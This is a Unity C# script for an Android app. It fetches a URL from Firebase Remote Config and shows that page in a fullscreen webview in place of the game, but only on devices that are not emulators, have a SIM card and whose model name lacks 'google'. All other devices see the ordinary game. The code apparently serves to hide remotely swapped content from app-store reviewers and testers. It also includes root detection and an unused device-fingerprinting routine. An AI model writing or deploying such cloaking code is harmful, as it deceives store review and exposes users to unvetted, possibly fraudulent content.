using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using Firebase.RemoteConfig;
using UnityEngine.UI;
using System;
using UnityEngine.SceneManagement;
using System.IO;

public class WebVievInit : MonoBehaviour
{
    public FirebaseInit Initializer;
    string Url, brandDevice;
    public bool simDevice;
    Text status;

    Firebase.DependencyStatus dependencyStatus = Firebase.DependencyStatus.UnavailableOther;

    //WebView Component
    WebViewObject webViewObject;
    //Required to check for a SIM card
    const string pluginName = "com.evgenindev.simdetector.Detector";
    static AndroidJavaClass _pluginClass;
    static AndroidJavaObject _pluginInstance;
    static AndroidJavaClass _unityPlayer;
    static AndroidJavaObject _unityActivity;

    public static AndroidJavaClass PluginClass
    {
        get
        {
            if(_pluginClass == null)
            {
                _pluginClass = new AndroidJavaClass(pluginName);
            }
            return _pluginClass;
        }
    }
    public static AndroidJavaObject PluginInstance
    {
        get
        {
            if( _pluginInstance == null)
            {
                _pluginInstance = PluginClass.CallStatic<AndroidJavaObject>("getInstance");
            }
            return _pluginInstance;
        }
    }
    public static AndroidJavaClass UnityPlayer
    {
        get
        {
            if(_unityPlayer == null)
            {
                _unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            }
            return _unityPlayer;
        }
    }
    public static AndroidJavaObject UnityActivity
    {
        get
        {
            if(_unityActivity == null)
            {
                _unityActivity = UnityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
            }
            return _unityActivity;
        }
    }

    
    private void Start()
    {
        Url = PlayerPrefs.GetString("key", "");
        if(Url == "")
        {
            StartCoroutine(FirstStart());
        }
        else
        {
            LoadFire();
        }
        
        //StartCoroutine(StartProgram());
    }
    IEnumerator FirstStart()
    {
        while (Initializer.FbStatus == FirebaseInit.FirebaseStatus.Waiting)
        {
            yield return new WaitForSeconds(0.1f);
            Debug.Log("Waiting");
        }
        if (Initializer.FbStatus == FirebaseInit.FirebaseStatus.Connected)
        {
            Url = FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
            if (Url != "")
                PlayerPrefs.SetString("key", Url);
        }
        LoadFire();
    }

    public void LoadFire()
    {
        //Url = FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
        brandDevice = SystemInfo.deviceModel.ToLower();
        simDevice = GetSimStatus();
        if(IsEmulator() || Url == "" || brandDevice.Contains("google") || !simDevice)
        {
            StartGame();
            return;
        }
        else
        {
            StartCoroutine(StartWebPage());
        }
    }

    public void StartGame()
    {
        SceneManager.LoadScene(1);
    }
    bool GetSimStatus()
    {
        int sim = PluginInstance.Call<int>("getSimStatus", UnityActivity);
        if (sim == 1)
            return true;
        return false;
    }

    void Update()
    {
        if (Input.GetKey(KeyCode.Escape))
        {
            if(webViewObject.CanGoBack())
            {
                webViewObject.GoBack();
            }
        }
    }

    public static string GetData()
    {
        string result = "";

        if (Application.platform == RuntimePlatform.Android)
        {
            var osBuild = new AndroidJavaClass("android.os.Build");
            string brand = osBuild.GetStatic<string>("BRAND");
            string fingerPrint = osBuild.GetStatic<string>("FINGERPRINT");
            string model = osBuild.GetStatic<string>("MODEL");
            string menufacturer = osBuild.GetStatic<string>("MANUFACTURER");
            string device = osBuild.GetStatic<string>("DEVICE");
            string product = osBuild.GetStatic<string>("PRODUCT");

            result += Application.installerName;
            result += "/";
            result += Application.installMode.ToString();
            result += "/";
            result += Application.buildGUID;
            result += "/";
            result += "Genuine :" + Application.genuine;
            result += "/";
            result += "Rooted : " + isRooted();
            result += "/";
            result += "Emulator : " + IsEmulator();
            result += "/";
            result += "Model : " + model;
            result += "/";
            result += "Menufacturer : " + menufacturer;
            result += "/";
            result += "Device : " + device;
            result += "/";
            result += "Fingerprint : " + fingerPrint;
            result += "/";
            result += "Product : " + product;
        }
        else
        {
            result += Application.installerName;
            result += "/";
            result += Application.installMode.ToString();
            result += "/";
            result += Application.buildGUID;
            result += "/";
            result += "Genuine :" + Application.genuine;
            result += "/";
        }
        return result;
    }


    public static bool isRooted()
    {
        bool isRoot = false;

        if (Application.platform == RuntimePlatform.Android)
        {
            if (isRootedPrivate("/system/bin/su"))
                isRoot = true;
            if (isRootedPrivate("/system/xbin/su"))
                isRoot = true;
            if (isRootedPrivate("/system/app/SuperUser.apk"))
                isRoot = true;
            if (isRootedPrivate("/data/data/com.noshufou.android.su"))
                isRoot = true;
            if (isRootedPrivate("/sbin/su"))
                isRoot = true;
        }

        return isRoot;
    }
    public static bool IsEmulator()
    {
        if (Application.platform == RuntimePlatform.Android)
        {
            AndroidJavaClass osBuild;
            osBuild = new AndroidJavaClass("android.os.Build");
            string fingerPrint = osBuild.GetStatic<string>("FINGERPRINT");
            string model = osBuild.GetStatic<string>("MODEL");
            string menufacturer = osBuild.GetStatic<string>("MANUFACTURER");
            string brand = osBuild.GetStatic<string>("BRAND");
            string device = osBuild.GetStatic<string>("DEVICE");
            string product = osBuild.GetStatic<string>("PRODUCT");

            return fingerPrint.Contains("generic")
                    || fingerPrint.Contains("unknown")
                      || model.Contains("google_sdk")
                    || model.Contains("Emulator")
                   || model.Contains("Android SDK built for x86")
              || menufacturer.Contains("Genymotion")
                || (brand.Contains("generic") && device.Contains("generic"))
        || product.Equals("google_sdk")
                || product.Equals("unknown");

        }
        if (Application.platform == RuntimePlatform.OSXEditor)
        {
            return true;
        }
        return false;
    }

    public static bool isRootedPrivate(string path)
    {
        bool boolTemp = false;

        if (File.Exists(path))
        {
            boolTemp = true;
        }

        return boolTemp;
    }

    public void checkIfDeviceIsRooted()
    {
        if (isRooted())
        {
            //device is rooted,do something
            Application.Quit();
        }

    }
    public void checkIfDeviceIsEmulator()
    {
        if (IsEmulator())
        {
            //device is emulator,do something
            Application.Quit();
        }

    }

    IEnumerator StartWebPage()
    {
        webViewObject = (new GameObject("WebViewObject")).AddComponent<WebViewObject>();
        webViewObject.Init(
            cb: (msg) =>
            {
                Debug.Log(string.Format("CallFromJS[{0}]", msg));
                status.text = msg;
                status.GetComponent<Animation>().Play();
            },
            err: (msg) =>
            {
                Debug.Log(string.Format("CallOnError[{0}]", msg));
                status.text = msg;
                status.GetComponent<Animation>().Play();
            },
            httpErr: (msg) =>
            {
                Debug.Log(string.Format("CallOnHttpError[{0}]", msg));
                status.text = msg;
                status.GetComponent<Animation>().Play();
            },
            started: (msg) =>
            {
                Debug.Log(string.Format("CallOnStarted[{0}]", msg));
            },
            hooked: (msg) =>
            {
                Debug.Log(string.Format("CallOnHooked[{0}]", msg));
            },
            ld: (msg) =>
            {
                Debug.Log(string.Format("CallOnLoaded[{0}]", msg));
#if UNITY_EDITOR_OSX || (!UNITY_ANDROID && !UNITY_WEBPLAYER && !UNITY_WEBGL)
                // NOTE: depending on the situation, you might prefer
                // the 'iframe' approach.
                // cf. https://github.com/gree/unity-webview/issues/189
#if true
                webViewObject.EvaluateJS(@"
                  if (window && window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.unityControl) {
                    window.Unity = {
                      call: function(msg) {
                        window.webkit.messageHandlers.unityControl.postMessage(msg);
                      }
                    }
                  } else {
                    window.Unity = {
                      call: function(msg) {
                        window.location = 'unity:' + msg;
                      }
                    }
                  }
                ");
#else
                webViewObject.EvaluateJS(@"
                  if (window && window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.unityControl) {
                    window.Unity = {
                      call: function(msg) {
                        window.webkit.messageHandlers.unityControl.postMessage(msg);
                      }
                    }
                  } else {
                    window.Unity = {
                      call: function(msg) {
                        var iframe = document.createElement('IFRAME');
                        iframe.setAttribute('src', 'unity:' + msg);
                        document.documentElement.appendChild(iframe);
                        iframe.parentNode.removeChild(iframe);
                        iframe = null;
                      }
                    }
                  }
                ");
#endif
#elif UNITY_WEBPLAYER || UNITY_WEBGL
                webViewObject.EvaluateJS(
                    "window.Unity = {" +
                    "   call:function(msg) {" +
                    "       parent.unityWebView.sendMessage('WebViewObject', msg)" +
                    "   }" +
                    "};");
#endif
                webViewObject.EvaluateJS(@"Unity.call('ua=' + navigator.userAgent)");
            }
            //transparent: false,
            //zoom: true,
            //ua: "custom user agent string",
            //// android
            //androidForceDarkMode: 0,  // 0: follow system setting, 1: force dark off, 2: force dark on
            //// ios
            //enableWKWebView: true,
            //wkContentMode: 0,  // 0: recommended, 1: mobile, 2: desktop
            //wkAllowsLinkPreview: true,
            //// editor
            //separated: false
            );
#if UNITY_EDITOR_OSX || UNITY_STANDALONE_OSX
        webViewObject.bitmapRefreshCycle = 1;
#endif
        // cf. https://github.com/gree/unity-webview/pull/512
        // Added alertDialogEnabled flag to enable/disable alert/confirm/prompt dialogs. by KojiNakamaru � Pull Request #512 � gree/unity-webview
        //webViewObject.SetAlertDialogEnabled(false);

        // cf. https://github.com/gree/unity-webview/pull/728
        //webViewObject.SetCameraAccess(true);
        //webViewObject.SetMicrophoneAccess(true);

        // cf. https://github.com/gree/unity-webview/pull/550
        // introduced SetURLPattern(..., hookPattern). by KojiNakamaru � Pull Request #550 � gree/unity-webview
        //webViewObject.SetURLPattern("", "^https://.*youtube.com", "^https://.*google.com");

        // cf. https://github.com/gree/unity-webview/pull/570
        // Add BASIC authentication feature (Android and iOS with WKWebView only) by takeh1k0 � Pull Request #570 � gree/unity-webview
        //webViewObject.SetBasicAuthInfo("id", "password");

        //webViewObject.SetScrollbarsVisibility(true);

        webViewObject.SetMargins(0, 0, 0, 0);
        webViewObject.SetTextZoom(100);  // android only. cf. https://stackoverflow.com/questions/21647641/android-webview-set-font-size-system-default/47017410#47017410
        webViewObject.SetVisibility(true);

#if !UNITY_WEBPLAYER && !UNITY_WEBGL
        if (Url.StartsWith("http"))
        {
            webViewObject.LoadURL(Url.Replace(" ", "%20"));
        }
        else
        {
            var exts = new string[]{
                ".jpg",
                ".js",
                ".html"  // should be last
            };
            foreach (var ext in exts)
            {
                var url = Url.Replace(".html", ext);
                var src = System.IO.Path.Combine(Application.streamingAssetsPath, url);
                var dst = System.IO.Path.Combine(Application.persistentDataPath, url);
                byte[] result = null;
                if (src.Contains("://"))
                {  // for Android
#if UNITY_2018_4_OR_NEWER
                    // NOTE: a more complete code that utilizes UnityWebRequest can be found in https://github.com/gree/unity-webview/commit/2a07e82f760a8495aa3a77a23453f384869caba7#diff-4379160fa4c2a287f414c07eb10ee36d
                    var unityWebRequest = UnityWebRequest.Get(src);
                    yield return unityWebRequest.SendWebRequest();
                    result = unityWebRequest.downloadHandler.data;
#else
                    var www = new WWW(src);
                    yield return www;
                    result = www.bytes;
#endif
                }
                else
                {
                    result = System.IO.File.ReadAllBytes(src);
                }
                System.IO.File.WriteAllBytes(dst, result);
                if (ext == ".html")
                {
                    webViewObject.LoadURL("file://" + dst.Replace(" ", "%20"));
                    break;
                }
            }
        }
#else
        if (Url.StartsWith("http")) {
            webViewObject.LoadURL(Url.Replace(" ", "%20"));
        } else {
            webViewObject.LoadURL("StreamingAssets/" + Url.Replace(" ", "%20"));
        }
#endif
        yield break;
    }
}